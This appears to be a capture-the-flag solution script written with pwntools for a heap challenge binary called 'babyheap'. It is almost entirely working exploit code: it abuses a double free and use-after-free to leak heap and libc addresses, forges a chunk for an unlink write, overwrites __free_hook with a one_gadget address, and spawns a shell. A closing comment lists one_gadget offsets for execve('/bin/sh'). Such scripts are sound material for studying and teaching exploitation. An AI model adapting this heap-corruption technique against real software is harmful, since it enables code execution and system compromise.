from pwn import *

p = process("./babyheap")
context.log_level = "debug"
elf = ELF("./babyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("Choice:" , str(c))
def add(index , content):
	cmd(1)
	p.sendlineafter("Index:" , str(index))
	if len(content) == 0x20:
		content = content[:-1]
	p.sendlineafter("Content:" , content)

def edit(index , content):
	cmd(2)
	if len(content) == 0x20:
		content = content[:-1]
	p.sendlineafter("Index:" , str(index))
	p.sendlineafter("Content:" , content)

def show(index):
	cmd(3)
	p.sendlineafter("Index:" , str(index))

def free(index):
	cmd(4)
	p.sendlineafter("Index:" , str(index))

add(0 , "a") 
add(1 , "b") # 0x30 # start
add(2 , "c") # 0x60
add(3 , "d") # 0x90
ptr = 0x602060 + 0x20
add(4 , p64(0) + p64(0x31) + p64(ptr - 0x18) + p64(ptr - 0x10))
add(5 , p64(0x30) + p64(0x30)) # unlink , target chunk

free(1)
free(0)

show(0)
heap_addr = u64(p.recvuntil("\n" , drop = True).ljust( 8 , "\x00")) - 0x30

edit(0 , p64(heap_addr + 0x20) + p64(0) * 2 + p64(0x31))
add(6 , "0")
add(7 , p64(0) + p64(0xa1))
# leak libc and unlink
free(1)
show(1)

libc_base = u64(p.recvuntil("\n" , drop = True).ljust(8 , "\x00")) - 88 - 0x3c4b20
free_hook = libc_base + libc.sym["__free_hook"]
# modify ptr[1] = &free_hook
edit(4 , p64(free_hook))
edit(1 , p64(libc_base + 0x4526a))

free(3)
p.interactive()
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""